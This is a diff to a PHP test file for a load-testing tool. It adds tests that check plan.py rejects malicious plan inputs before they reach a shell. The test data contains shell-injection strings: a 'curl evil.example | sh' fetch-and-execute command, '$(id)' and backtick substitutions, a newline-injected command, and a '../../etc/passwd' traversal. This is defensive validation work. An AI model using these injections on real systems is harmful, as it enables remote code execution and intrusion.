@@ -147,7 +147,10 @@ test('the think-time override defaults to each page\'s own pauses, and bin/run p
         ->and($lib)->toContain("parseFloat(__ENV.THINK_MAX || '')")
         ->and($run)->toContain('think=""')
         ->and($run)->toContain('think_env=(-e THINK_MIN="${think% *}" -e THINK_MAX="${think#* }")')
-        ->and($run)->toContain('${think_env[@]+"${think_env[@]}"}');
+        ->and($run)->toContain('${think_env[@]+"${think_env[@]}"}')
+        // Checked before anything runs: no 0 s pause, and a warm-up duration k6 accepts.
+        ->and($run)->toContain('[[ "$think" =~ ^[1-9][0-9]*\\ [1-9][0-9]*$ ]]')
+        ->and(strpos($run, '[[ "$warmup" =~ ^[0-9]+[sm]$ ]] || {'))->toBeLessThan(strpos($run, 'for d in "${level_duration:-'));
 });
 
 test('bin/run stops one level past saturation by the same rule summarize.py reports', function () {
@@ -213,3 +216,48 @@ test('a billing day that does not finish is reported, not summed to a short time
         ->and(loadtestFile('loadtest/bin/run'))->toContain('> "$results/automation-exit.json"')
         ->and(loadtestFile('loadtest/bin/summarize.py'))->toContain("load(run / 'automation-exit.json', {})");
 });
+
+/** Runs loadtest/bin/plan.py --label on $plan. @return array{int, string, string} exit code, stdout, stderr */
+function loadtestPlan(array $plan): array
+{
+    $file = tempnam(sys_get_temp_dir(), 'pr543-plan-');
+    file_put_contents($file, json_encode($plan, JSON_THROW_ON_ERROR));
+    $process = proc_open(['python3', LOADTEST_ROOT.'/loadtest/bin/plan.py', '--label', $file], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
+    expect($process)->not->toBeFalse('python3 should run plan.py');
+    $out = (string) stream_get_contents($pipes[1]);
+    $err = (string) stream_get_contents($pipes[2]);
+    $status = proc_close($process);
+    unlink($file);
+
+    return [$status, $out, $err];
+}
+
+test('plan.py turns a valid plan into the matrix', function () {
+    [$status, $out] = loadtestPlan(['runs' => [['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']]]);
+
+    expect($status)->toBe(0)
+        ->and(json_decode($out, true)[0])->toMatchArray(['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']);
+});
+
+test('plan.py refuses a hostile or wasteful plan before anything reaches a shell', function (array $runs, string $reason) {
+    [$status, $out, $err] = loadtestPlan(['runs' => $runs]);
+
+    // A refused plan prints no matrix, so the load job never starts.
+    expect($status)->not->toBe(0)
+        ->and($out)->toBe('')
+        ->and($err)->toContain($reason);
+})->with([
+    'unknown key' => [[['profile' => 'small', 'secrets' => 'inherit']], "unknown key 'secrets'"],
+    'runner' => [[['profile' => 'small', 'runner' => 'self-hosted']], "unknown key 'runner'"],
+    'allow_smaller_runner' => [[['profile' => 'large', 'allow_smaller_runner' => true]], "unknown key 'allow_smaller_runner'"],
+    'command in levels' => [[['profile' => 'small', 'levels' => '5; curl evil.example | sh']], 'levels'],
+    'substitution in name' => [[['profile' => 'small', 'name' => 'a$(id)']], 'name'],
+    'backticks in duration' => [[['profile' => 'small', 'level_duration' => '1m`id`']], 'level_duration'],
+    'newline in think' => [[['profile' => 'small', 'think' => "10 30\nid"]], 'think'],
+    'unknown profile' => [[['profile' => '../../etc/passwd']], 'profile must be one of'],
+    'more than 3 runs' => [array_fill(0, 4, ['profile' => 'small']), '1 to 3 runs'],
+    'no runs' => [[], '1 to 3 runs'],
+    'think 0 0' => [[['profile' => 'small', 'think' => '0 0']], 'think'],
+    'think minimum 0' => [[['profile' => 'small', 'think' => '0 30']], 'think'],
+    'think reversed' => [[['profile' => 'small', 'think' => '30 10']], 'the smaller number first'],
+]);
